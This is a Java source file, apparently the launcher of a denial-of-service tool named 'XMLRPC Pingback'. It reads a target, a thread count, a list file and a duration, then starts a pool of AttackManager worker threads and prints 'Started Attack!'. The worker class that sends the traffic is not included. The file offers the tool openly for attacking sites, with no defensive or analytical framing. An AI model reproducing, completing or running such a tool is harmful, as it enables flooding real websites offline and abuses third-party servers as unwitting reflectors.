package org;

import java.util.concurrent.*;

public class Main
{
    public static String target;
    public static int time;
    public static int threads;
    
    static {
        Main.target = "";
        Main.time = 0;
        Main.threads = 0;
    }
    
    public static void main(final String[] args) {
        if (args.length != 4) {
            System.out.println("XMLRPC Pingback - Written by Crusader");
            System.out.println("http://ssyn.pl/");
            System.out.println("twitter: @crusaderthegod");
            System.out.println("Usage: <target> <threads> <list> <time>");
            return;
        }
        Main.target = args[0];
        Main.threads = Integer.parseInt(args[1]);
        AttackManager.load(args[2]);
        Main.time = Integer.parseInt(args[3]);
        System.out.println("XMLRPC Pingback - Written by Crusader");
        System.out.println("http://ssyn.pl/");
        System.out.println("twitter: @crusaderthegod");
        new Thread() {
            public void run() {
                try {
                    Thread.sleep(Main.time * 1000);
                    System.exit(0);
                }
                catch (InterruptedException ex) {}
            }
        }.start();
        final ExecutorService executor = Executors.newFixedThreadPool(Main.threads);
        for (int i = 0; i != Main.threads; ++i) {
            final Runnable worker = new AttackManager();
            executor.execute(worker);
        }
        System.out.println("Started Attack!");
    }
}
